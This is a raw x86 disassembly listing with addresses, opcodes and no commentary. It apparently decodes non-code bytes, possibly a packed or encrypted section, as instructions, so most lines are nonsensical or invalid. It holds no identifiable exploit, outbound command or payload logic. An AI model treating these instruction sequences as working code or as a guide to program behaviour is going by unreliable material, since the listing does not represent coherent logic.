  416dd9:	add    eax,0x40404340
  416dde:	inc    ebx
  416ddf:	inc    eax
  416de0:	test   BYTE PTR [eax],al
  416de2:	add    eax,0x40624041
  416de7:	inc    eax
  416de8:	add    BYTE PTR [edx+0x5],ah
  416deb:	inc    ebx
  416dec:	add    BYTE PTR [eax+0x78],al
  416def:	inc    ecx
  416df0:	add    BYTE PTR [eax+0x41],bl
  416df3:	bound  esp,QWORD PTR [edi]
  416df5:	ins    BYTE PTR es:[edi],dx
  416df6:	inc    ecx
  416df7:	inc    eax
  416df8:	inc    eax
  416df9:	in     eax,0x5
  416dfb:	add    eax,0xdd437f1a
  416e00:	je     0x416e15
  416e02:	xchg   BYTE PTR [ebp+0x62],al
  416e05:	bound  esi,QWORD PTR [eax]
  416e07:	fwait
  416e08:	inc    eax
  416e09:	lock and eax,0x904a1541
  416e0f:	fnsave [eax-0x77]
  416e12:	fstp   DWORD PTR [eax-0x33b8cf33]
  416e18:	inc    eax
  416e19:	lahf   
  416e1a:	add    eax,0x851a248d
  416e1f:	push   cs
  416e20:	jb     0x416e34
  416e22:	xchg   BYTE PTR [eax-0x18bc63aa],ch
  416e28:	inc    eax
  416e29:	test   BYTE PTR [eax],al
  416e2b:	int3   
  416e2c:	bound  eax,QWORD PTR ds:0xcc840f41
  416e32:	inc    ebx
  416e33:	add    BYTE PTR [eax+0x0],al
  416e36:	inc    eax
  416e37:	inc    eax
  416e38:	inc    eax
  416e39:	int3   
  416e3a:	add    BYTE PTR ds:0x62404341,al
  416e40:	pop    eax
  416e41:	add    BYTE PTR [ebx+0x40],al
  416e44:	bound  ecx,QWORD PTR [edi]
  416e46:	inc    eax
  416e47:	inc    eax
  416e48:	add    eax,0x54621232
  416e4d:	nop
  416e4e:	cs inc eax
  416e50:	push   edi
  416e51:	fcomp  DWORD PTR [eax-0x1c]
  416e54:	push   ecx
  416e55:	add    dh,BYTE PTR [eax]
  416e57:	ins    DWORD PTR es:[edi],dx
  416e58:	add    DWORD PTR ds:0x43dd7811,eax
  416e5e:	inc    ebx
  416e5f:	or     DWORD PTR [edx],0xffffff86
  416e62:	retf   
  416e63:	bound  eax,QWORD PTR [eax-0x2f]
  416e66:	mov    ebx,0x482f01c0
  416e6b:	add    BYTE PTR [eax],al
  416e6d:	inc    eax
  416e6e:	inc    eax
  416e6f:	cmovno eax,DWORD PTR ds:0x40056243
  416e76:	int3   
  416e77:	add    ah,cl
  416e79:	inc    eax
  416e7a:	inc    eax
  416e7b:	bound  eax,QWORD PTR [ecx+0x0]
  416e7e:	add    BYTE PTR [edi],cl
  416e80:	inc    ebx
  416e81:	inc    eax
  416e82:	inc    eax
  416e83:	add    BYTE PTR [ecx+0x43],al
  416e86:	add    eax,0x40256240
  416e8b:	bound  eax,QWORD PTR [eax]
  416e8d:	mov    ch,BYTE PTR [eax+eiz*8-0x2813ec19]
  416e94:	or     eax,0x45b55020
  416e99:	inc    eax
  416e9a:	test   DWORD PTR ds:0x933c5b45,eax
  416ea0:	push   edx
  416ea1:	adc    dh,ah
  416ea3:	xchg   BYTE PTR [ecx-0x80],al
  416ea6:	repz jno 0x416e73
  416ea9:	add    eax,0x4140cc00
  416eae:	inc    eax
  416eaf:	inc    ebx
  416eb0:	bound  esp,QWORD PTR ds:0x41400043
  416eb6:	add    BYTE PTR [eax],al
  416eb8:	add    eax,0x43624062
  416ebd:	inc    ecx
  416ebe:	inc    eax
  416ebf:	inc    eax
  416ec0:	inc    eax
  416ec1:	add    eax,0x40624340
  416ec6:	add    eax,0x40664140
  416ecb:	dec    ebx
  416ecc:	xchg   BYTE PTR [esi],ch
  416ece:	cwde   
  416ecf:	addr16 int3 
  416ed1:	inc    ecx
  416ed2:	push   esi
  416ed3:	shl    DWORD PTR [ecx],0xd6
  416ed6:	pushf  
  416ed7:	cmc    
  416ed8:	fs inc ebx
  416eda:	cs push 0xf4a8054e
  416ee0:	data16 xor BYTE PTR [eax],ah
  416ee3:	ret    0x8601
  416ee6:	adc    BYTE PTR [esi+0x40],ah
  416ee9:	add    BYTE PTR [eax+0x64274221],0xad
  416ef0:	inc    di
  416ef2:	xchg   ebx,eax
  416ef3:	push   es
  416ef4:	test   ch,dl
  416ef6:	add    bh,BYTE PTR [eax]
  416ef8:	xchg   ecx,eax
  416ef9:	test   DWORD PTR [ebx+0x0],eax
  416efc:	add    eax,0x41107840
  416f01:	bound  eax,QWORD PTR [eax+0x40]
  416f04:	sldt   WORD PTR [eax-0x34]
  416f08:	js     0x416f6c
  416f0a:	add    eax,0x40664143
  416f0f:	inc    ebx
  416f10:	add    BYTE PTR [ecx+0x5],al
  416f13:	js     0x416f55
  416f15:	bound  eax,QWORD PTR [eax+0x0]
  416f18:	inc    eax
  416f19:	inc    ecx
  416f1a:	adc    DWORD PTR [ebx-0x40babdfb],edi
  416f20:	inc    ebx
  416f21:	adc    eax,edx
  416f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f24:	xchg   BYTE PTR [esi],ah
  416f26:	fsubr  DWORD PTR [eax+edx*4+0x24]
  416f2a:	sub    DWORD PTR [ebp+0x46ee9029],esp
  416f30:	pop    ds
  416f31:	mul    DWORD PTR [edi-0x7b]
  416f34:	aam    0x62
  416f36:	or     eax,edi
  416f38:	inc    ebx
  416f39:	sub    al,0xc3
  416f3b:	cmp    al,0x5
  416f3d:	inc    esp
  416f3e:	imul   eax,DWORD PTR [ecx+0x43],0x62054040
  416f45:	inc    ecx
  416f46:	inc    ebx
  416f47:	add    BYTE PTR [eax+0x0],al
  416f4a:	bound  eax,QWORD PTR ds:0x40621040
  416f50:	inc    ebx
  416f51:	inc    ecx
  416f52:	add    eax,0x4340
  416f57:	add    eax,0x404162
  416f5c:	add    BYTE PTR [eax+0x43],al
  416f5f:	inc    eax
  416f60:	add    eax,0x5466d1cf
  416f65:	add    BYTE PTR [esi-0x5e579da9],0x3e
  416f6c:	shr    DWORD PTR [eax+eiz*2],0x39
  416f70:	push   eax
  416f71:	adc    bh,bh
  416f73:	retf   0x5564
  416f76:	rol    DWORD PTR [eax+0x0],cl
  416f79:	add    BYTE PTR [ecx+0x43],al
  416f7c:	add    eax,0x41784062
  416f81:	inc    eax
  416f82:	inc    eax
  416f83:	add    BYTE PTR [edi],cl
  416f85:	bound  eax,QWORD PTR [ebx+0x0]
  416f88:	add    eax,0x25006240
  416f8d:	inc    eax
  416f8e:	add    eax,0x40254143
  416f93:	add    eax,0x3a620000
  416f98:	pop    ebp
  416f99:	cwde   
  416f9a:	bound  eax,QWORD PTR [ebx-0x3c]
  416f9d:	add    al,BYTE PTR ds:0x1341cdab
  416fa3:	push   ebp
  416fa4:	xor    BYTE PTR [esi],dh
  416fa6:	xchg   BYTE PTR [eax-0x65be3f95],ch
  416fac:	dec    ecx
  416fad:	cmp    DWORD PTR gs:[ecx],edx
  416fb0:	or     ebp,DWORD PTR [eax]
  416fb2:	inc    ebx
  416fb3:	scas   al,BYTE PTR es:[edi]
  416fb4:	ror    BYTE PTR [ecx],0xd2
  416fb7:	pop    esp
  416fb8:	popf   
  416fb9:	inc    ebx
  416fba:	add    BYTE PTR [eax],al
  416fbc:	add    BYTE PTR [ecx+0x40],al
  416fbf:	bound  esp,QWORD PTR [esi+0x0]
  416fc2:	inc    eax
  416fc3:	add    eax,0x5400000
  416fc8:	inc    ecx
  416fc9:	inc    eax
  416fca:	inc    eax
  416fcb:	bound  esp,QWORD PTR ds:0x25050043
  416fd1:	inc    ecx
  416fd2:	inc    ebx
  416fd3:	inc    eax
  416fd4:	test   BYTE PTR [eax+0x0],al
  416fd7:	bound  ebx,QWORD PTR [eax+0x62]
  416fda:	inc    ecx
  416fdb:	inc    eax
  416fdc:	pop    esp
  416fdd:	xor    BYTE PTR [eax+0x32],cl
  416fe0:	dec    ebp
  416fe1:	add    eax,0xfc2a0508
  416fe6:	(bad)  
  416fe9:	xchg   BYTE PTR [ebx+0x5d],al
  416fec:	push   ecx
  416fed:	inc    edi
  416fee:	dec    edi
  416fef:	push   eax
  416ff0:	sub    esp,DWORD PTR [ebx]
  416ff2:	and    ch,bh
  416ff4:	leave  
  416ff5:	test   DWORD PTR [eax-0x5f2ec840],eax
  416ffb:	rep lods al,BYTE PTR ds:[esi]
  416ffd:	inc    ebx
  416ffe:	cs das 
  417000:	push   esp
  417001:	add    eax,0x9042f062
  417006:	test   eax,0x1e860150
  41700b:	(bad)  
  41700c:	fst    DWORD PTR [eax]
  41700e:	bound  eax,QWORD PTR [eax+0x41]
  417011:	and    eax,0x40000500
  417016:	inc    ebx
  417017:	add    eax,0x40624041
  41701c:	inc    ebx
  41701d:	add    eax,0x43402541
  417022:	bound  eax,QWORD PTR [eax+0x43]
  417025:	int3   
  417026:	inc    eax
  417027:	bound  eax,QWORD PTR [eax]
  417029:	inc    ecx
  41702a:	inc    eax
  41702b:	inc    eax
  41702c:	add    eax,0xc0233c05
  417031:	jbe    0x41705c
  417033:	ss int 0x0
  417036:	inc    ebx
  417037:	shl    BYTE PTR [eax],cl
  417039:	add    eax,edx
  41703b:	xchg   ebp,eax
  41703c:	mov    esp,0x7e00d162
  417041:	dec    eax
  417042:	add    eax,0x84cb6562
  417047:	add    al,0xc0
  417049:	add    DWORD PTR [esi-0xbb7bfc7],0x2c5732d2
  417053:	cld    
  417054:	bound  eax,QWORD PTR [eax+0x25]
  417057:	add    BYTE PTR [esi+0x40],ah
  41705a:	add    eax,0x40404143
  41705f:	inc    ebx
  417060:	add    BYTE PTR [eax],al
  417062:	add    BYTE PTR [edx-0x34],ah
  417065:	inc    eax
  417066:	add    eax,0x40004041
  41706b:	inc    ecx
  41706c:	int3   
  41706d:	add    BYTE PTR [ebx-0x7c],al
  417070:	add    eax,0x5406240
  417075:	bound  edi,QWORD PTR [esp+esi*1]
  417078:	jmp    0x2b434557
  41707d:	outs   dx,BYTE PTR ds:[esi]
  41707e:	aad    0x40
  417080:	or     eax,0x40c9c120
  417085:	xchg   ecx,eax
  417086:	bound  edx,QWORD PTR [eax+0x41]
  417089:	dec    esi
  41708a:	rol    BYTE PTR [ecx+0x4207584a],1
  417090:	inc    ebx
  417091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417092:	ret    0x8c0e
  417095:	sub    eax,edx
  417097:	sbb    eax,0x7ebdf30
  41709c:	push   edx
  41709d:	shl    BYTE PTR [ebx-0x10],0x40
  4170a1:	bound  ebx,QWORD PTR [eax+0x41]
  4170a4:	add    eax,0x40404340
  4170a9:	inc    ebx
  4170aa:	inc    eax
  4170ab:	test   BYTE PTR [eax],al
  4170ad:	add    eax,0x40624041
  4170b2:	inc    eax
  4170b3:	add    BYTE PTR [edx+0x5],ah
  4170b6:	inc    ebx
  4170b7:	add    BYTE PTR [eax+0x78],al
  4170ba:	inc    ecx
  4170bb:	add    BYTE PTR [eax+0x41],bl
  4170be:	bound  eax,QWORD PTR [esp+edx*1-0x3731dda0]
  4170c5:	popf   
  4170c6:	bound  eax,QWORD PTR [edi-0x80]
  4170c9:	xor    BYTE PTR [ecx-0x5b3ab0fb],al
  4170cf:	test   DWORD PTR [esi],ebx
  4170d1:	ret    0x863f
  4170d4:	sub    bh,BYTE PTR [esp+eax*1]
  4170d7:	inc    ebx
  4170d8:	stos   BYTE PTR es:[edi],al
  4170d9:	xor    BYTE PTR [eax+esi*1+0x74],bh
  4170dd:	mov    dh,0xcd
  4170df:	nop
  4170e0:	es dec ebp
  4170e2:	inc    eax
  4170e3:	test   BYTE PTR [eax],al
  4170e5:	int3   
  4170e6:	bound  eax,QWORD PTR ds:0xcc840f41
  4170ec:	inc    ebx
  4170ed:	add    BYTE PTR [eax+0x0],al
  4170f0:	inc    eax
  4170f1:	inc    eax
  4170f2:	inc    eax
  4170f3:	int3   
  4170f4:	add    BYTE PTR ds:0x62404341,al
  4170fa:	pop    eax
  4170fb:	add    BYTE PTR [ebx+0x40],al
  4170fe:	bound  ecx,QWORD PTR [edi]
  417100:	inc    eax
  417101:	add    ebp,ecx
  417103:	test   al,0x4c
  417105:	arpl   cx,bx
  417107:	clc    
  417108:	ror    DWORD PTR [edx],0x5
  41710b:	cs inc edi
  41710d:	dec    eax
  41710e:	inc    ebx
  41710f:	adc    eax,DWORD PTR [ecx+0x7]
  417112:	xchg   BYTE PTR [esi],ch
  417114:	leave  
  417115:	not    cl
  417117:	rol    al,0x57
  41711a:	xor    ebp,DWORD PTR [edi+ebp*8+0x27a165cd]
  417121:	add    ecx,esp
  417123:	retf   
  417124:	test   al,0x75
  417126:	pop    ecx
  417127:	ins    DWORD PTR es:[edi],dx
  417128:	inc    eax
  417129:	rol    DWORD PTR ds:0xf1351115,cl
  41712f:	adc    eax,0x82a9
  417134:	inc    eax
  417135:	inc    eax
  417136:	cmovno eax,DWORD PTR ds:0x40056243
  41713d:	int3   
  41713e:	add    ah,cl
  417140:	inc    eax
  417141:	inc    eax
  417142:	bound  eax,QWORD PTR [ecx+0x0]
  417145:	add    BYTE PTR [edi],cl
  417147:	inc    ebx
  417148:	inc    eax
  417149:	inc    eax
  41714a:	add    BYTE PTR [ecx+0x43],al
  41714d:	add    eax,0x40256240
  417152:	bound  eax,QWORD PTR [eax]
  417154:	xchg   BYTE PTR [ecx+0x48],al
  417157:	sub    DWORD PTR [edx],ebx
  417159:	bound  ebx,QWORD PTR [eax]
  41715b:	mov    dh,0x35
  41715d:	ret    
  41715e:	inc    ecx
  41715f:	cs inc ecx
  417161:	cmp    al,0x44
  417163:	(bad)  
  417164:	retf   
  417165:	dec    esi
  417166:	inc    edi
  417167:	pop    eax
  417168:	inc    ebx
  417169:	push   0x280586c0
  41716e:	fsub   DWORD PTR [eax+esi*1+0x5]
  417172:	das    
  417173:	das    
  417174:	xchg   BYTE PTR [edi+0x4c],ah
  417177:	stc    
  417178:	clc    
  417179:	scas   eax,DWORD PTR es:[edi]
  41717a:	dec    eax
  41717b:	push   ecx
  41717c:	xor    al,0x90
  41717e:	add    eax,0xc0504e62
  417183:	add    eax,DWORD PTR ds:0x4140cc00
  417189:	inc    eax
  41718a:	inc    ebx
  41718b:	bound  esp,QWORD PTR ds:0x41400043
  417191:	add    BYTE PTR [eax],al
  417193:	add    eax,0x43624062
  417198:	inc    ecx
  417199:	inc    eax
  41719a:	inc    eax
  41719b:	inc    eax
  41719c:	add    eax,0x40624340
  4171a1:	add    eax,0x40664140
  4171a6:	retf   0x224
  4171a9:	hlt    
  4171aa:	lea    ebp,[esi+0x30]
  4171ad:	mov    ch,0x5
  4171af:	lods   al,BYTE PTR ds:[esi]
  4171b0:	xchg   esi,eax
  4171b1:	add    DWORD PTR [ebx-0x70],0x586d56e
  4171b8:	bound  ebp,QWORD PTR [eax-0x7d3cbd70]
  4171be:	and    DWORD PTR [ecx-0x41],eax
  4171c1:	mov    edi,0x2cfe25f6
  4171c6:	leave  
  4171c7:	mov    gs,WORD PTR [ecx-0x3e83bcd6]
  4171cd:	dec    esp
  4171ce:	add    eax,0xd110b078
  4171d3:	mov    DWORD PTR [ebx+0x0],0x10784005
  4171da:	inc    ecx
  4171db:	bound  eax,QWORD PTR [eax+0x40]
  4171de:	sldt   WORD PTR [eax-0x34]
  4171e2:	js     0x417246
  4171e4:	add    eax,0x40664143
  4171e9:	inc    ebx
  4171ea:	add    BYTE PTR [ecx+0x5],al
  4171ed:	js     0x41722f
  4171ef:	bound  eax,QWORD PTR [eax+0x0]
  4171f2:	inc    eax
  4171f3:	or     eax,DWORD PTR ds:0x488fa886
  4171f9:	scas   eax,DWORD PTR es:[edi]
  4171fa:	scas   al,BYTE PTR es:[edi]
  4171fb:	xlat   BYTE PTR ds:[ebx]
  4171fc:	push   edx
  4171fd:	xor    al,0x4b
  4171ff:	and    eax,DWORD PTR [edi+eax*4+0x4a]
  417203:	jle    0x41718b
  417205:	enter  0xdb36,0x58
  417209:	stos   BYTE PTR es:[edi],al
  41720a:	or     al,dl
  41720c:	cmp    al,BYTE PTR ds:0x3420c044
  417212:	push   edx
  417213:	out    dx,eax
  417214:	jle    0x41719c
  417216:	dec    esp
  417217:	arpl   WORD PTR [edx],dx
  417219:	inc    ecx
  41721a:	cwde   
  41721b:	xor    eax,0x57d53302
  417220:	cwde   
  417221:	inc    ebx
  417222:	inc    ebx
  417223:	push   eax
  417224:	inc    ecx
  417225:	inc    ebx
  417226:	inc    eax
  417227:	inc    eax
  417228:	add    eax,0x434162
  41722d:	inc    eax
  41722e:	add    BYTE PTR [edx+0x5],ah
  417231:	inc    eax
  417232:	adc    BYTE PTR [edx+0x40],ah
  417235:	inc    ebx
  417236:	inc    ecx
  417237:	add    eax,0x4340
  41723c:	add    eax,0x404162
  417241:	add    BYTE PTR [eax+0x43],al
  417244:	inc    eax
  417245:	add    eax,0xc804c72e
  41724a:	adc    eax,0x7ec00530
  41724f:	add    eax,0xf4cd40a8
  417254:	gs adc al,0x83
  417257:	xchg   BYTE PTR [eax],dl
  417259:	xor    al,BYTE PTR [ecx+0x47]
  41725c:	shl    BYTE PTR [ecx],1
  41725e:	cmc    
  41725f:	xor    al,0xb4
  417261:	and    DWORD PTR [ecx-0x7b],esp
  417264:	out    0xc1,eax
  417266:	(bad)  
  417267:	mov    BYTE PTR ds:0xaa43e0a4,0xd2
  41726e:	add    DWORD PTR ds:0x9062c0cb,0x41000040
  417278:	inc    ebx
  417279:	add    eax,0x41784062
  41727e:	inc    eax
  41727f:	inc    eax
  417280:	add    BYTE PTR [edi],cl
  417282:	bound  eax,QWORD PTR [ebx+0x0]
  417285:	add    eax,0x25006240
  41728a:	inc    eax
  41728b:	add    eax,0x40254143
  417290:	add    eax,0xb620000
  417295:	les    eax,FWORD PTR [esi+eax*4+0x4c]
  417299:	push   edx
  41729a:	pop    ebx
  41729b:	xchg   ebx,eax
  41729c:	iret   
  41729d:	jae    0x41729f
  41729f:	das    
  4172a0:	stos   DWORD PTR es:[edi],eax
  4172a1:	lods   al,BYTE PTR ds:[esi]
  4172a2:	and    BYTE PTR [ebx+0x17],al
  4172a5:	inc    eax
  4172a6:	sub    eax,0x2ac340c5
  4172ab:	shr    DWORD PTR [esi],1
  4172ad:	jno    0x4172fe
  4172af:	add    eax,0xe784bc46
  4172b4:	leave  
  4172b5:	sbb    BYTE PTR [ecx],al
  4172b7:	xchg   BYTE PTR [edx],dl
  4172b9:	ds aaa 
  4172bb:	mov    ebx,0x2f53e5e9
  4172c0:	sbb    BYTE PTR [ecx+0x43],ch
  4172c3:	add    BYTE PTR [eax],al
  4172c5:	add    BYTE PTR [ecx+0x40],al
  4172c8:	bound  esp,QWORD PTR [esi+0x0]
  4172cb:	inc    eax
  4172cc:	add    eax,0x5400000
  4172d1:	inc    ecx
  4172d2:	inc    eax
  4172d3:	inc    eax
  4172d4:	bound  esp,QWORD PTR ds:0x25050043
  4172da:	inc    ecx
  4172db:	inc    ebx
  4172dc:	inc    eax
  4172dd:	test   BYTE PTR [eax+0x0],al
  4172e0:	bound  ebx,QWORD PTR [eax+0x62]
  4172e3:	inc    ecx
  4172e4:	inc    eax
  4172e5:	push   esp
  4172e6:	add    DWORD PTR [ecx-0x3e],ecx
  4172e9:	add    al,0xc4
  4172eb:	bound  ebx,QWORD PTR [ecx+0x62]
  4172ee:	and    eax,0x52e3a11
  4172f3:	add    eax,0xd141b4d8
  4172f8:	inc    eax
  4172f9:	inc    ebp
  4172fa:	xchg   BYTE PTR [edi-0x5abcfaf6],al
  417300:	sub    DWORD PTR [edx+eiz*1],eax
  417303:	cmp    BYTE PTR [edi],cl
  417305:	xchg   DWORD PTR [eax],esi
  417307:	push   es
  417308:	dec    ebx
  417309:	xor    eax,ebx
  41730b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41730c:	mov    DWORD PTR [eax],ebp
  41730e:	lock rcr BYTE PTR es:[edx+0x41136205],0x42
  417317:	xchg   esp,eax
  417318:	ins    DWORD PTR es:[edi],dx
  417319:	xchg   BYTE PTR es:[eax],dl
  41731c:	bound  eax,QWORD PTR [eax+0x41]
  41731f:	and    eax,0x40000500
  417324:	inc    ebx
  417325:	add    eax,0x40624041
  41732a:	inc    ebx
  41732b:	add    eax,0x43402541
  417330:	bound  eax,QWORD PTR [eax+0x43]
  417333:	int3   
  417334:	inc    eax
  417335:	bound  eax,QWORD PTR [eax]
  417337:	inc    ecx
  417338:	inc    eax
  417339:	inc    eax
  41733a:	add    eax,0x4d286005
  41733f:	cmc    
  417340:	sub    al,0x4b
  417342:	mov    esp,DWORD PTR [eax-0x70]
  417345:	(bad)  
  417346:	cld    
  417347:	addr16 ffree st(5)
  41734a:	and    edx,eax
  41734c:	bound  edx,QWORD PTR [eax]
  41734e:	lahf   
  41734f:	pop    ecx
  417350:	ss adc eax,0x50420505
  417356:	cmp    al,0xc8
  417358:	(bad)  
  41735a:	jae    0x4172e2
  41735c:	leave  
  41735d:	bound  eax,QWORD PTR [eax+0x25]
  417360:	add    BYTE PTR [esi+0x40],ah
  417363:	add    eax,0x40404143
  417368:	inc    ebx
  417369:	add    BYTE PTR [eax],al
  41736b:	add    BYTE PTR [edx-0x34],ah
  41736e:	inc    eax
  41736f:	add    eax,0x40004041
  417374:	inc    ecx
  417375:	int3   
  417376:	add    BYTE PTR [ebx-0x7c],al
  417379:	add    eax,0x5406240
  41737e:	(bad)  
  41737f:	leave  
  417380:	xor    BYTE PTR [eax+0x3d81cbc9],dh
  417386:	mov    ah,0xde
  417388:	pushf  
  417389:	inc    ebx
  41738a:	push   ecx
  41738b:	fisubr DWORD PTR [ebx-0x3f]
  41738e:	xor    eax,DWORD PTR [eax+ebp*2-0x2f]
  417392:	mov    cl,0xc7
  417394:	add    DWORD PTR ds:0x8c4dccef,0x40ef154c
  41739e:	bound  ebx,QWORD PTR [eax+0x41]
  4173a1:	add    eax,0x40404340
  4173a6:	inc    ebx
  4173a7:	inc    eax
  4173a8:	test   BYTE PTR [eax],al
  4173aa:	add    eax,0x40624041
  4173af:	inc    eax
  4173b0:	add    BYTE PTR [edx+0x5],ah
  4173b3:	inc    ebx
  4173b4:	add    BYTE PTR [eax+0x78],al
  4173b7:	inc    ecx
  4173b8:	add    BYTE PTR [eax+0x41],bl
  4173bb:	bound  eax,QWORD PTR [esi-0x5622949d]
  4173c1:	mov    esi,0x593409c7
  4173c6:	add    al,0x64
  4173c8:	push   ss
  4173c9:	stos   DWORD PTR es:[edi],eax
  4173ca:	dec    ecx
  4173cb:	jno    0x41738d
  4173cd:	cmp    eax,0xbe52281c
  4173d2:	into   
  4173d3:	add    DWORD PTR ds:0x41e062d9,0x844071
  4173dd:	int3   
  4173de:	bound  eax,QWORD PTR ds:0xcc840f41
  4173e4:	inc    ebx
  4173e5:	add    BYTE PTR [eax+0x0],al
  4173e8:	inc    eax
  4173e9:	inc    eax
  4173ea:	inc    eax
  4173eb:	int3   
  4173ec:	add    BYTE PTR ds:0x62404341,al
  4173f2:	pop    eax
  4173f3:	add    BYTE PTR [ebx+0x40],al
  4173f6:	bound  ecx,QWORD PTR [edi]
  4173f8:	inc    eax
  4173f9:	xor    al,BYTE PTR [edi-0x7a]
  4173fc:	pop    edi
  4173fd:	jmp    0x2c01:0xedd43ac
  417404:	xor    al,0xd0
  417406:	outs   dx,DWORD PTR ds:[esi]
  417407:	xor    BYTE PTR [edi+ecx*8],bh
  41740a:	pop    ebx
  41740b:	mov    edi,0xec0b6209
  417410:	sub    BYTE PTR [edi],bh
  417412:	add    bh,BYTE PTR [edi+0x47b06263]
  417418:	rol    BYTE PTR [esi-0x41],cl
  41741b:	mov    edi,0x8562f865
  417420:	add    BYTE PTR [eax],al
  417422:	inc    eax
  417423:	inc    eax
  417424:	cmovno eax,DWORD PTR ds:0x40056243
  41742b:	int3   
  41742c:	add    ah,cl
  41742e:	inc    eax
  41742f:	inc    eax
  417430:	bound  eax,QWORD PTR [ecx+0x0]
  417433:	add    BYTE PTR [edi],cl
  417435:	inc    ebx
  417436:	inc    eax
  417437:	inc    eax
  417438:	add    BYTE PTR [ecx+0x43],al
  41743b:	add    eax,0x40256240
  417440:	bound  eax,QWORD PTR [eax]
  417442:	pop    edi
  417443:	outs   dx,DWORD PTR ds:[esi]
  417444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417445:	aas    
  417446:	cmp    eax,0xca434e62
  41744b:	cmp    eax,0x2251c5c1
  417450:	cmp    BYTE PTR [eax-0x79fcbb30],dl
  417456:	arpl   ax,dx
  417458:	or     eax,0x1eadeb4d
  41745d:	xor    eax,0x43564000
  417462:	jmp    0x4676d6
  417467:	int3   
  417468:	inc    eax
  417469:	inc    ecx
  41746a:	inc    eax
  41746b:	inc    ebx
  41746c:	bound  esp,QWORD PTR ds:0x41400043
  417472:	add    BYTE PTR [eax],al
  417474:	add    eax,0x43624062
  417479:	inc    ecx
  41747a:	inc    eax
  41747b:	inc    eax
  41747c:	inc    eax
  41747d:	add    eax,0x40624340
  417482:	add    eax,0x40664140
  417487:	jno    0x4174f5
  417489:	clc    
  41748a:	xchg   ebp,eax
  41748b:	shr    DWORD PTR [edi+0x62402935],1
  417491:	imul   edx,DWORD PTR [ebp+0x49],0x4c
  417495:	inc    eax
  417496:	dec    ebp
  417497:	and    BYTE PTR [ecx+0x611c35e8],ch
  41749d:	jg     0x41749f
  41749f:	pop    eax
  4174a0:	inc    ebp
  4174a1:	inc    ebx
  4174a2:	add    BYTE PTR ds:0x41107840,al
  4174a8:	bound  eax,QWORD PTR [eax+0x40]
  4174ab:	sldt   WORD PTR [eax-0x34]
  4174af:	js     0x417513
  4174b1:	add    eax,0x40664143
  4174b6:	inc    ebx
  4174b7:	add    BYTE PTR [ecx+0x5],al
  4174ba:	js     0x4174fc
  4174bc:	bound  eax,QWORD PTR [eax+0x0]
  4174bf:	inc    eax
  4174c0:	inc    ebp
  4174c1:	and    al,BYTE PTR [ebx-0x2c]
  4174c4:	push   ecx
  4174c5:	arpl   WORD PTR es:[ebx-0x276fd927],bp
  4174cc:	inc    ecx
  4174cd:	pop    ecx
  4174ce:	xchg   BYTE PTR [edx+0x61],al
  4174d1:	push   esp
  4174d2:	inc    ecx
  4174d3:	dec    ebx
  4174d4:	jecxz  0x417457
  4174d6:	and    DWORD PTR [ebx+0x514300ab],ebp
  4174dc:	inc    ecx
  4174dd:	and    DWORD PTR [edi+0x304a44b8],edi
  4174e3:	inc    edx
  4174e4:	inc    ebp
  4174e5:	add    edi,DWORD PTR [edi+0x4043410d]
  4174eb:	inc    eax
  4174ec:	add    eax,0x434162
  4174f1:	inc    eax
  4174f2:	add    BYTE PTR [edx+0x5],ah
  4174f5:	inc    eax
  4174f6:	adc    BYTE PTR [edx+0x40],ah
  4174f9:	inc    ebx
  4174fa:	inc    ecx
  4174fb:	add    eax,0x4340
  417500:	add    eax,0x404162
  417505:	add    BYTE PTR [eax+0x43],al
  417508:	inc    eax
  417509:	add    eax,0xe5e83654
  41750e:	inc    eax
  41750f:	sub    edi,DWORD PTR [edi+0x476ecbc9]
  417515:	jp     0x41753f
  417517:	jnp    0x417556
  417519:	inc    ebp
  41751a:	inc    esi
  41751b:	test   al,0x85
  41751d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41751e:	jae    0x4174a1
  417520:	lds    eax,FWORD PTR [ebp-0x58]
  417523:	mov    edi,0x52403043
  417528:	xchg   BYTE PTR [eax+edx*1],bh
  41752b:	sub    dl,BYTE PTR [eax+0x26811d86]
  417531:	cs dec esp
  417533:	inc    eax
  417534:	add    BYTE PTR [eax],al
  417536:	inc    ecx
  417537:	inc    ebx
  417538:	add    eax,0x41784062
  41753d:	inc    eax
  41753e:	inc    eax
  41753f:	add    BYTE PTR [edi],cl
  417541:	bound  eax,QWORD PTR [ebx+0x0]
  417544:	add    eax,0x25006240
  417549:	inc    eax
  41754a:	add    eax,0x40254143
  41754f:	add    eax,0x41620000
  417554:	push   0xffffff89
  417556:	sub    DWORD PTR [ebx+0x46],ecx
  417559:	mov    BYTE PTR [ecx+0xf],al
  41755c:	inc    ebx
  41755d:	les    ebx,FWORD PTR [edi]
  41755f:	cmp    DWORD PTR [ecx],0xd1883e64
  417565:	sub    eax,0x48644e40
  41756a:	cwde   
  41756b:	(bad)  
  41756d:	shl    BYTE PTR [eax+0x1],0x63
  417571:	cmp    al,0x67
  417573:	or     al,0xaf
  417575:	jns    0x4175d2
  417577:	dec    edx
  417578:	xchg   bh,ch
  41757a:	inc    edi
  41757b:	les    ebp,FWORD PTR [ecx+0x25854073]
  417581:	push   ds
  417582:	inc    ebx
  417583:	bound  ebp,QWORD PTR [ecx+0x5]
  417586:	das    
  417587:	dec    esi
  417588:	ret    0x8961
  41758b:	mov    esi,0x43
  417590:	inc    ecx
  417591:	inc    eax
  417592:	bound  esp,QWORD PTR [esi+0x0]
  417595:	inc    eax
  417596:	add    eax,0x5400000
  41759b:	inc    ecx
  41759c:	inc    eax
  41759d:	inc    eax
  41759e:	bound  esp,QWORD PTR ds:0x25050043
  4175a4:	inc    ecx
  4175a5:	inc    ebx
  4175a6:	inc    eax
  4175a7:	test   BYTE PTR [eax+0x0],al
  4175aa:	bound  ebx,QWORD PTR [eax+0x62]
  4175ad:	inc    ecx
  4175ae:	inc    eax
  4175af:	inc    ecx
  4175b0:	mov    edi,0x62228149
  4175b5:	push   0x40f14334
  4175ba:	add    esp,DWORD PTR [edx+0x43]
  4175bd:	sbb    al,0xd7
  4175bf:	xor    BYTE PTR [edx+0x60],al
  4175c2:	add    al,0xc5
  4175c4:	mov    ah,0xd8
  4175c6:	in     al,0xe4
  4175c8:	jp     0x417617
  4175ca:	or     DWORD PTR [esi+0x47626248],eax
  4175d0:	push   ebx
  4175d1:	inc    edx
  4175d2:	mov    esi,0x7362f224
  4175d7:	test   DWORD PTR [eax],edx
